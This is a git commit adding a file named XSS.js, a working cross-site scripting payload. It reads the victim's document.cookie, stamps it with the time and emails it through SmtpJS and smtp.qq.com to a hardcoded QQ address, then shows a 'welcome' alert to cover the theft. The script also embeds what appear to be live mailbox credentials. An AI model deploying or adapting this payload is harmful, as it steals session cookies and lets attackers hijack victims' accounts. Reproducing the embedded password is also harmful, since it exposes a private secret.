ad513f5da091aa15e8a2b72338eb97c1c5065c56
tragic52 <83164953+tragic52@users.noreply.github.com>
2021-05-14 13:29:44 +0800

    纠正名称

---
+++ XSS.js
@@ -0,0 +1,44 @@
+/* SmtpJS.com - v3.0.0 */
+var Email = { send: function (a) { return new Promise(function (n, e) { a.nocache = Math.floor(1e6 * Math.random() + 1), a.Action = "Send"; var t = JSON.stringify(a); Email.ajaxPost("https://smtpjs.com/v3/smtpjs.aspx?", t, function (e) { n(e) }) }) }, ajaxPost: function (e, n, t) { var a = Email.createCORSRequest("POST", e); a.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), a.onload = function () { var e = a.responseText; null != t && t(e) }, a.send(n) }, ajax: function (e, n) { var t = Email.createCORSRequest("GET", e); t.onload = function () { var e = t.responseText; null != n && n(e) }, t.send() }, createCORSRequest: function (e, n) { var t = new XMLHttpRequest; return "withCredentials" in t ? t.open(e, n, !0) : "undefined" != typeof XDomainRequest ? (t = new XDomainRequest).open(e, n) : t = null, t } };
+Date.prototype.format = function(fmt){
+  var o = {
+    "M+" : this.getMonth()+1,                 //月份
+    "d+" : this.getDate(),                    //日
+    "h+" : this.getHours(),                   //小时
+    "m+" : this.getMinutes(),                 //分
+    "s+" : this.getSeconds(),                 //秒
+    "q+" : Math.floor((this.getMonth()+3)/3), //季度
+    "S"  : this.getMilliseconds()             //毫秒
+  };
+
+  if(/(y+)/.test(fmt)){
+    fmt=fmt.replace(RegExp.$1, (this.getFullYear()+"").substr(4 - RegExp.$1.length));
+  }
+        
+  for(var k in o){
+    if(new RegExp("("+ k +")").test(fmt)){
+      fmt = fmt.replace(
+        RegExp.$1, (RegExp.$1.length==1) ? (o[k]) : (("00"+ o[k]).substr((""+ o[k]).length)));  
+    }       
+  }
+
+  return fmt;
+}
+var now = new Date();
+var nowStr = now.format("yyyy-MM-dd hh:mm:ss");
+//cookie
+var s=document.cookie;
+//内容整合：
+   var text="时间："+nowStr+"______"+'\n'+"cookie:"+s+'\n'+"";
+//邮件发送
+Email.send({
+    Host : "smtp.qq.com",  //你所用邮箱的smtp地址
+    Username : "1520402908@qq.com",      //你的邮箱用户名（如xxx@qq.com）
+    Password : "zixxgjmmubujgdhf",      
+    To : '1520402908@qq.com',           //收件人邮箱地址
+    From : "1520402908@qq.com",       //发件人邮箱地址
+    Subject : "This is the subject",  //邮件主题
+    Body : text  //邮件内容
+}).then(
+  message=> alert("欢迎光临")
+);
